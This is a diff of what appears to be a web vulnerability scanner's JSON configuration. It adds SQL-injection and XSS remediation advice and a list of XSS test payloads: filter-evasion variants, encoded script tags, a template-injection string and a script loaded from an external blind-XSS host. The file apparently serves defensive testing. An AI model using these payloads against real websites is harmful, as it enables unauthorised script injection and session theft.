@@ -5,13 +5,13 @@
               "name": "error-based",
               "severity": 1,
               "description": "description of error-based sql injection",
-              "recommendations": "do not be stupid"
+              "recommendations": "{'description':'Implement the following solutions:','mitigations':['Validate and verify input existence, length, type and permitted values, and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.','Use secure database access methods in the application's development processes. It is recommended to construct and execute queries through the use of Prepared Statements or Stored Procedures. ']}"
             },
             {
               "name": "rxss",
               "severity": 2,
               "description": "description of rxss",
-              "recommendations": "do not click on unknown links"
+              "recommendations": "{'description':'Implement the following solutions:','mitigations':['Validate and verify input existence, length, type, permitted values and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.','Encode user-controlled output based on the context into which it is being embedded.','Prevent unauthorized user inputs from being embedded into client-side scripts.','sanitize all user input data on the client side.']}"
             }
           ],
   "SQLI Payloads":
@@ -26,6 +26,54 @@
             {
               "payload": "<script>console.log(123)</script>",
               "expectedResult": "<script>console.log(123)</script>"
+            },
+            {
+              "payload": "eval('console'+'.log(0)');",
+              "expectedResult": "eval('console.log(0)'"
+            },
+            {
+              "payload": "<sCrIpt>console.log(1)</ScRipt>",
+              "expectedResult": "<sCrIpt>console.log(1)</ScRipt>"
+            },
+            {
+              "payload": "<noscript><p title=\"</noscript><img src=x onerror=console.log(1)>\">",
+              "expectedResult": "<img src=x onerror=console.log(1)>"
+            },
+            {
+              "payload": "\"><script src=//yoursubdomain.xss.ht></script>",
+              "expectedResult": "<script src=//yoursubdomain.xss.ht></script>"
+            },
+            {
+              "payload": "<div onpointerover=\"console.log(45)\">MOVE HERE</div>",
+              "expectedResult": "<div onpointerover=\"console.log(45)\">MOVE HERE</div>"
+            },
+            {
+              "payload": "<img src=x onerror=console.log(String.fromCharCode(88,83,83));>",
+              "expectedResult": "<img src=x onerror=console.log"
+            },
+            {
+              "payload": "<scr<script>ipt>console.log('XSS')</scr<script>ipt>",
+              "expectedResult": "<script>console.log('XSS')</script>"
+            },
+            {
+              "payload": "\"><script>console.log('XSS')</script>",
+              "expectedResult": "<script>console.log('XSS')</script>"
+            },
+            {
+              "payload": "<x>%00%00%00%00%00%00%00<script>console.log(1)</script>",
+              "expectedResult": "<script>console.log(1)</script>"
+            },
+            {
+              "payload": "\\');console.log(1);//",
+              "expectedResult": "');console.log(1);"
+            },
+            {
+              "payload": "{{constructor.constructor('console.log(1)')()}}",
+              "expectedResult": "{{constructor.constructor('console.log(1)')()}}"
+            },
+            {
+              "payload": "%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%36%33%25%36%66%25%36%65%25%37%33%25%36%66%25%36%63%25%36%35%25%32%65%25%36%63%25%36%66%25%36%37%25%32%38%25%33%31%25%32%39%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65",
+              "expectedResult": "<script>console.log(1)</script>"
             }
           ],
   "Responses":
